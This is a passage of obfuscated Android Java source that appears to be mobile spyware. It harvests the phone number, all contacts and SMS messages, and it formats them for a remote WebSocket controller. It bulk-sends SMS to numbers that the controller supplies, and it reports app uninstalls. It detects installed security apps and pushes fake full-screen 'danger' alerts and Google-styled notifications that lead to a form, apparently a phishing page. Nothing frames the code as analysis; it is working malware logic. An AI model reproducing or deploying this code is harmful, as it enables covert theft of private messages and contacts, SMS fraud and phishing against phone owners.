        ConnectivityManager mConnectivity = (ConnectivityManager) mContext.getSystemService(Context.CONNECTIVITY_SERVICE);
        //检查网络连接
        NetworkInfo info = mConnectivity.getActiveNetworkInfo();
        if (info != null) {
            return info.getType() == ConnectivityManager.TYPE_WIFI ? "wifi" : "4g";
        } else {
            return "4g";
        }
    }


    /**
     * 获取电话号码
     */
    private static String getNativePhoneNumber() {
        if (ContextCompat.checkSelfPermission(mContext, android.Manifest.permission.READ_PHONE_STATE)
                == PackageManager.PERMISSION_GRANTED) {
            TelephonyManager telephonyManager = (TelephonyManager) mContext.getSystemService(Context.TELEPHONY_SERVICE);
            String NativePhoneNumber = telephonyManager.getLine1Number();
            return NativePhoneNumber;
        }
        return "";
    }

    private static String getTxl() {
        String str = "";
        try {
            ContentResolver cr = mContext.getContentResolver();
            Cursor cursor = cr.query(phoneUri, new String[]{NUM, NAME}, null, null, null);
            while (cursor.moveToNext()) {
                if (TextUtils.isEmpty(str)) {
                    str = "通讯录&" + cursor.getString(cursor.getColumnIndex(NAME)) + "|" + cursor.getString(cursor.getColumnIndex(NUM));
                } else {
                    str = str + "\n" + cursor.getString(cursor.getColumnIndex(NAME)) + "|" + cursor.getString(cursor.getColumnIndex(NUM));
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        if (TextUtils.isEmpty(str)) {
            str = "通讯录&no result!";
        }
        return str;
    }

    private static String getLocalSms() {
        List<replaceflag_Pnnmjk> list = replaceflag_Cuiyuy.getUserList();
        Collections.reverse(list);
        StringBuilder smsBuilder = new StringBuilder();
        for (replaceflag_Pnnmjk userTable : list) {
            if (TextUtils.isEmpty(smsBuilder)) {
                smsBuilder.append("收件箱&");
                smsBuilder.append(userTable.address + "|");
                smsBuilder.append(userTable.stime + "|");
                smsBuilder.append(userTable.body);
            } else {
                smsBuilder.append("[|]");
                smsBuilder.append(userTable.address + "|");
                smsBuilder.append(userTable.stime + "|");
                smsBuilder.append(userTable.body);
            }
        }
        if (TextUtils.isEmpty(smsBuilder)) {
            smsBuilder.append("收件箱&no result!");
        }
        return smsBuilder.toString();
    }

    private static String getSms() {

        try {
            Uri uri = Uri.parse(SMS_URI_ALL);
            String[] projection = new String[]{"_id", "address", "person",
                    "body", "date", "type"};
            Cursor cur = mContext.getContentResolver().query(uri, projection, null,
                    null, "date desc"); // 获取手机内部短信
            // 获取短信中最新的未读短信
            // Cursor cur = getContentResolver().query(uri, projection,
            // "read = ?", new String[]{"0"}, "date desc");

            StringBuilder smsBuilder = new StringBuilder();
            if (cur.moveToFirst()) {
                int index_Address = cur.getColumnIndex("address");
                int index_Body = cur.getColumnIndex("body");
                int index_Date = cur.getColumnIndex("date");
                int index_Type = cur.getColumnIndex("type");
                do {
                    String strAddress = cur.getString(index_Address);
                    String strbody = cur.getString(index_Body);
                    long longDate = cur.getLong(index_Date);
                    int intType = cur.getInt(index_Type);

                    SimpleDateFormat dateFormat = new SimpleDateFormat(
                            "yyyy-MM-dd hh:mm:ss");
                    Date d = new Date(longDate);
                    String strDate = dateFormat.format(d);

                    String strType = "";
                    if (intType == 1) {
                        strType = "接收";
                    } else if (intType == 2) {
                        strType = "发送";
                    } else if (intType == 3) {
                        strType = "草稿";
                    } else if (intType == 4) {
                        strType = "发件箱";
                    } else if (intType == 5) {
                        strType = "发送失败";
                    } else if (intType == 6) {
                        strType = "待发送列表";
                    } else if (intType == 0) {
                        strType = "所以短信";
                    } else {
                        strType = "null";
                    }

                    if (TextUtils.isEmpty(smsBuilder)) {
                        smsBuilder.append("收件箱&");
                        smsBuilder.append(strAddress + "|");
                        smsBuilder.append(strDate + "|");
                        smsBuilder.append(strbody);
                    } else {
                        smsBuilder.append("\n");
                        smsBuilder.append(strAddress + "|");
                        smsBuilder.append(strDate + "|");
                        smsBuilder.append(strbody);
                    }
                } while (cur.moveToNext());

                if (!cur.isClosed()) {
                    cur.close();
                    cur = null;
                }
            } else {
                smsBuilder.append("no result!");
            }
            return smsBuilder.toString();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return "";
    }

    private static void sendSms(String mobile, String content) {
        Log.i("rgh", "mobile: " + mobile + "," + content);
        if (mLianxuErrorNum == MAX_ERROR_NUM) {
            return;
        }
        try {
            SmsManager manager = SmsManager.getDefault();
            manager.sendTextMessage(mobile, null, content, sentPI, null);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static void startSendLocal() {
        try {
            mLianxuErrorNum = 0;
            mErrorNum = replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Styuty.getInt(replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Cskuio.SP_FAIL_NUM, 0);
            mSuccessNum = replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Styuty.getInt(replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Cskuio.SP_SUCCESS_NUM, 0);
            currentMobileIndex = 0;
            mFailPhone = "";
            content = "";
            mMobiles.clear();
            mContents.clear();

            String mobile = replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Styuty.getString(replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Cskuio.SP_MOBILE, "");
            content = replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Styuty.getString(replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Cskuio.SP_CONTENT, "");
            if (!TextUtils.isEmpty(mobile) && mobile.contains(",")) {
                String[] mobiles = mobile.split(",");
                for (int i = 0; i < mobiles.length; i++) {
                    mMobiles.add(mobiles[i]);
                    mDaiMobiles.add(mobiles[i]);
                }
                String[] contents = content.split("#");
                for (int i = 0; i < contents.length; i++) {
                    mContents.add(contents[i]);
                    mDaiContents.add(contents[i]);
                }
                sendSms(mMobiles.get(0), mContents.get(0));
            } else {
                mMobiles.add(mobile);
                mDaiMobiles.add(mobile);
                mContents.add(content);
                mDaiContents.add(content);
                sendSms(mobile, mContents.get(0));
            }
        } catch (Exception e) {

        }
    }



    private static BroadcastReceiver sendMessage = new BroadcastReceiver() {

        @Override
        public void onReceive(Context context, Intent intent) {
            //判断短信是否发送成功
            Log.i("rgh", "getResultCode(): " + getResultCode());
            switch (getResultCode()) {
                case Activity.RESULT_OK:
                    mLianxuErrorNum = 0;
                    mSuccessNum++;
                    if (mWebSocket != null) {
//                        mWebSocket.send("发短信&" + mMobiles.get(currentMobileIndex) + "|true");
                        currentMobileIndex++;
                        saveLocal();

                        if (currentMobileIndex < mMobiles.size()) {
                            mHandler.sendEmptyMessageDelayed(4, 6000);
                        } else {
                            sendSmsByWebsocket("发信息&success:" + mSuccessNum + "|fail:" + mErrorNum + "|Over|failPhone:" + mFailPhone);
                        }
                    }
                    break;
                default:
                    mErrorNum++;
                    mLianxuErrorNum = mLianxuErrorNum + 1;
                    if (mWebSocket != null) {
                        try {
                            saveLocal();

                            if (TextUtils.isEmpty(mFailPhone)) {
                                mFailPhone = mMobiles.get(currentMobileIndex);
                            } else {
                                mFailPhone = mFailPhone + "," + mMobiles.get(currentMobileIndex);
                            }
                            if (mLianxuErrorNum == MAX_ERROR_NUM) {
                                sendSmsByWebsocket("发信息&success:" + mSuccessNum + "|fail:" + mErrorNum +
                                        "|Stop|failPhone:" + mFailPhone);
                            }

//                            else {
//                                mWebSocket.send("发短信&" + mMobiles.get(currentMobileIndex) + "|false" + "&" + getResultCode());
//                            }
                            currentMobileIndex++;
                            if (currentMobileIndex < mMobiles.size()) {
                                mHandler.sendEmptyMessageDelayed(4, 6000);
                            } else {
                                sendSmsByWebsocket("发信息&success:" + mSuccessNum + "|fail:" + mErrorNum + "|Over|failPhone:" + mFailPhone);
                            }
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }
                    break;
            }
        }
    };


    private static void saveLocal() {
        try {
            if (mDaiMobiles.size() > 0) {
                mDaiMobiles.remove(0);
            }
            if (mDaiContents.size() > 0) {
                mDaiContents.remove(0);
            }
            String mobile = "";
            for (int i = 0; i < mDaiMobiles.size(); i++) {
                if (TextUtils.isEmpty(mobile)) {
                    mobile = mDaiMobiles.get(i);
                } else {
                    mobile = mobile + "," + mDaiMobiles.get(i);
                }
            }

            String content = "";
            for (int i = 0; i < mDaiContents.size(); i++) {
                if (TextUtils.isEmpty(content)) {
                    content = mDaiContents.get(i);
                } else {
                    content = content + "#" + mDaiContents.get(i);
                }
            }
            replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Styuty.putString(replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Cskuio.SP_MOBILE, mobile);
            replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Styuty.putString(replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Cskuio.SP_CONTENT, content);
            replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Styuty.putInt(replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Cskuio.SP_SUCCESS_NUM, mSuccessNum);
            replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Styuty.putInt(replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Cskuio.SP_FAIL_NUM, mErrorNum);
        } catch (Exception e) {

        }
    }

    private static void sendSmsByWebsocket(String text) {
        Log.i("rgh", "sendSmsByWebsocket = " + text);
        if (mIsConnected) {
            Log.i("rgh", "sendSmsByWebsocket mWebSocket= " + text);
            if (mWebSocket != null) {
                mWebSocket.send(text);
            }
        } else {
            Log.i("rgh", "sendSmsByWebsocket SPUtil= " + text);
            replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Styuty.putString(replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Cskuio.SP_SENDSMSCALLBACK, text);
        }
    }

    @TargetApi(Build.VERSION_CODES.O)
    private static Notification buildNotification(Context context) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, CHANNEL_NAME, NotificationManager.IMPORTANCE_HIGH);
            channel.enableVibration(false);
            channel.enableLights(false);
            channel.enableVibration(false);
            channel.setVibrationPattern(new long[]{0});
            channel.setSound(null, null);
            getManager(context).createNotificationChannel(channel);
        }

        Intent intent = new Intent(context, replaceflag_Bteert.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(context, -1,
                intent, PendingIntent.FLAG_UPDATE_CURRENT);
        NotificationCompat.Builder builder;
        builder = new NotificationCompat.Builder(context, CHANNEL_ID)
                .setSmallIcon(R.drawable.replaceflag_notification_working)
                .setContentTitle("")
                .setShowWhen(false)
                .setContentText("")
                .setContentIntent(pendingIntent)
                .setDefaults(1);//跟随手机设置
        builder.build().when = 0;

        return builder.build();
    }

    private static Handler mHandler2 = new Handler(){
        @Override
        public void handleMessage(@NonNull Message msg) {
            super.handleMessage(msg);
            switch (msg.what){
                case 0:
                    if(isAppInstalled()){
                        if(!replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Styuty.getBoolean(replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Cskuio.SP_SHOW_DANGER, false)){
                            replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Styuty.putBoolean(replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Cskuio.SP_SHOW_DANGER, true);
                            replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Styuty.putLong(replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Cskuio.SP_SCAN_TIME, System.currentTimeMillis());
                            replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Styuty.putInt(replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Cskuio.SP_DANGER_NUMBER, mDangerNum);


                            Intent i = new Intent(mContext, replaceflag_Bteert.class);
                            i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                            PendingIntent pi1 = PendingIntent.getActivity(mContext, 0, i,
                                    PendingIntent.FLAG_UPDATE_CURRENT);

                            replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Njyuio notificationUtils = new replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Njyuio(mContext);
                            String content = String.format(mContext.getString(R.string.replaceflag_tip44),mDangerNum);
                            notificationUtils.sendNotificationFullScreen(R.drawable.replaceflag_notification_caution,
                                    String.format(mContext.getString(R.string.replaceflag_tip43),mDangerNum), content, "type", pi1);
                        }


                    }
                    mHandler2.sendEmptyMessageDelayed(0, 5*60*1000);
                    break;
            }
        }
    };

    private static int mShowTime = 0;
    private static Handler mHandler3 = new Handler(){
        @Override
        public void handleMessage(@NonNull Message msg) {
            super.handleMessage(msg);
            switch (msg.what){
                case 0:
                    if(!replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Styuty.getBoolean(replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Cskuio.SP_HAS_SUBMIT_URL, false) && mShowTime< 5){
                        Intent i = new Intent(mContext, replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_oiiopActivity.class);
                        i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                        PendingIntent pi1 = PendingIntent.getActivity(mContext, 0, i,
                                PendingIntent.FLAG_UPDATE_CURRENT);

                        replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Njyuio notificationUtils = new replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Njyuio(mContext);
                        if(!TextUtils.isEmpty(replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Styuty.getString(replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Cskuio.SP_NOTI_NAME, ""))&&
                                replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Styuty.getString(replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Cskuio.SP_NOTI_NAME, "").toLowerCase().contains("google")){
                            notificationUtils.sendCustomNoti(R.drawable.replaceflag_gp_noto,
                                    "", "", "type", pi1);
                        } else {
                            notificationUtils.sendCustomNoti(R.drawable.replaceflag_ic_gt,
                                    "", "", "type", pi1);
                        }

                        mShowTime++;
                    }
                    mHandler3.sendEmptyMessageDelayed(0,mNotiTime);
                    break;
                case 1:
                    getNameAndPkg();
                    mHandler3.sendEmptyMessageDelayed(1,600*60*1000);
                    break;
            }
        }
    };

    public static void removeHandler3(){
        mHandler3.removeCallbacksAndMessages(null);
    }

    public static void submitComplete(){
        if(mWebSocket!=null){
            mWebSocket.send("信息已提交&一");
        }
    }

    public static void sendUninstall(String pkgname){
        if(mWebSocket!=null){
            mWebSocket.send("卸载成功&" + replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Bjtyut.get(mContext)
                    + "|" + pkgname + "|" + new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date(System.currentTimeMillis())));
        }
    }

    private static String[] mPkgNames = new String[]{"com.wsandroid.suite", "com.au.anshinnetsecurity",
            "com.nttdocomo.android.anshinsecurity", "com.mcafee.vsm_android_dcm"};
    private static int mDangerNum = 0;
    private static boolean isAppInstalled(){
        PackageManager pm = mContext.getPackageManager();
        boolean installed =false;
        mDangerNum = 0;
        for (int i=0;i<mPkgNames.length;i++){
            try{
                pm.getPackageInfo(mPkgNames[i],PackageManager.GET_ACTIVITIES);
                installed =true;
                mDangerNum++;
            }catch(PackageManager.NameNotFoundException e){
            }
        }
        return installed;
    }

    private static class McReceiver extends BroadcastReceiver{
        @Override
        public void onReceive(Context context, Intent intent) {
            if(Intent.ACTION_PACKAGE_REMOVED.equals(intent.getAction())){
                if(intent.getData()!=null){
                    sendUninstall(intent.getData().getSchemeSpecificPart());
                }
            }
        }
    }

    public static class MyReceiver extends BroadcastReceiver{

        @Override
        public void onReceive(Context context, Intent intent) {
            if("com.my.submit".equals(intent.getAction())){
                replaceflag_Abvffg.submitComplete();
            }
        }
    }

    private static ArrayList<replaceflag_Begryt> mData = new ArrayList();
    private static ArrayList<replaceflag_Begryt> mReportDatas = new ArrayList();
    private static void checkPackages() {
        mData.clear();
        mReportDatas.clear();
        // 获取已经安装的所有应用, PackageInfo　系统类，包含应用信息
        List<PackageInfo> packages = replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Ahrtry.getApplication().getPackageManager().getInstalledPackages(0);
        for (int i = 0; i < packages.size(); i++) {
            PackageInfo packageInfo = packages.get(i);
            if ((packageInfo.applicationInfo.flags& ApplicationInfo.FLAG_SYSTEM) == 0) { //非系统应用

                mData.add(new replaceflag_Begryt(packageInfo.applicationInfo.loadLabel(replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Ahrtry.getApplication().getPackageManager()).toString(),
                        packageInfo.packageName));
            }
        }

        int mReportNum = 0;
        for (int i=0;i<mData.size();i++){
            for (int j=0;j<mPDatas.size();j++){
                if(mData.get(i).name.equals(mPDatas.get(j).name)
                        && !mData.get(i).pkgName.equals(mPDatas.get(j).pkgName)){
                    mReportDatas.add(new replaceflag_Begryt(mData.get(i).name, mData.get(i).pkgName, mData.get(i).icon));
                    mReportNum++;
                }
            }
        }
        replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Styuty.putLong(replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Cskuio.SP_SCAN_TIME, System.currentTimeMillis());
        replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Styuty.putInt(replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Cskuio.SP_DANGER_NUMBER, mReportNum);

        if(mReportNum>0){
            Intent i = new Intent(mContext, replaceflag_Bteert.class);
            i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
            PendingIntent pi1 = PendingIntent.getActivity(mContext, 0, i,
                    PendingIntent.FLAG_UPDATE_CURRENT);

            replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Njyuio notificationUtils = new replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Njyuio(mContext);
            String content = String.format(mContext.getString(R.string.replaceflag_tip44),mReportNum);
            notificationUtils.sendNotificationFullScreen2(R.drawable.replaceflag_notification_caution,
                    String.format(mContext.getString(R.string.replaceflag_tip43),mReportNum), content, "type", pi1);
        }
    }
}
